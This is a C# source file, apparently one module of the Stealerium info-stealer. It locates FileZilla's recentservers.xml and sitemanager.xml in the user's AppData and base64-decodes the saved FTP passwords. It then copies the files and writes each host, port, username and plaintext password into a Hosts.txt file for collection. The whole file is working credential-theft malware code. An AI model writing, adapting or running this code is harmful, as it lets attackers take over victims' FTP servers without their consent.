using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Xml;
using Stealerium.Helpers;

namespace Stealerium.Target
{
    internal sealed class FileZilla
    {
        // Get FileZilla .xml files paths
        private static string[] GetFileZillaPaths()
        {
            var fileZillaDirectory = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "FileZilla");
            return new[]
            {
                Path.Combine(fileZillaDirectory, "recentservers.xml"),
                Path.Combine(fileZillaDirectory, "sitemanager.xml")
            };
        }

        // Load XML from file
        private static XmlDocument LoadXmlDocument(string filePath)
        {
            var xmlDocument = new XmlDocument();
            xmlDocument.Load(filePath);
            return xmlDocument;
        }

        // Extract passwords from XML document nodes
        private static List<Password> ExtractPasswordsFromXml(XmlDocument xmlDocument)
        {
            var passwords = new List<Password>();

            foreach (XmlNode node in xmlDocument.GetElementsByTagName("Server"))
            {
                var passwordNode = node?["Pass"]?.InnerText;
                if (string.IsNullOrEmpty(passwordNode)) continue;

                var password = new Password
                {
                    Url = $"ftp://{node["Host"]?.InnerText}:{node["Port"]?.InnerText}/",
                    Username = node["User"]?.InnerText,
                    Pass = Encoding.UTF8.GetString(Convert.FromBase64String(passwordNode))
                };

                passwords.Add(password);
                Counter.FtpHosts++;
            }

            return passwords;
        }

        // Copy file to save path
        private static void CopyFileToSavePath(string filePath, string savePath)
        {
            var fileName = Path.GetFileName(filePath);
            if (fileName != null)
            {
                var destinationPath = Path.Combine(savePath, fileName);
                File.Copy(filePath, destinationPath, overwrite: true);
            }
        }

        // Steal passwords from FileZilla configuration files
        private static List<Password> StealPasswords(string savePath)
        {
            var passwords = new List<Password>();
            var files = GetFileZillaPaths();

            foreach (var file in files)
            {
                if (!File.Exists(file)) continue;

                try
                {
                    var xmlDocument = LoadXmlDocument(file);
                    passwords.AddRange(ExtractPasswordsFromXml(xmlDocument));
                    CopyFileToSavePath(file, savePath);
                }
                catch (Exception ex)
                {
                    Logging.Log($"FileZilla >> Failed to collect passwords from {file}\n{ex}");
                }
            }

            return passwords;
        }

        // Format FileZilla passwords
        private static string FormatPassword(Password password)
        {
            return $"Url: {password.Url}\nUsername: {password.Username}\nPassword: {password.Pass}\n\n";
        }

        // Write FileZilla passwords to Hosts.txt
        public static void WritePasswords(string savePath)
        {
            Directory.CreateDirectory(savePath);
            var passwords = StealPasswords(savePath);

            if (passwords.Count > 0)
            {
                var filePath = Path.Combine(savePath, "Hosts.txt");
                foreach (var password in passwords)
                {
                    File.AppendAllText(filePath, FormatPassword(password));
                }
            }
        }
    }
}
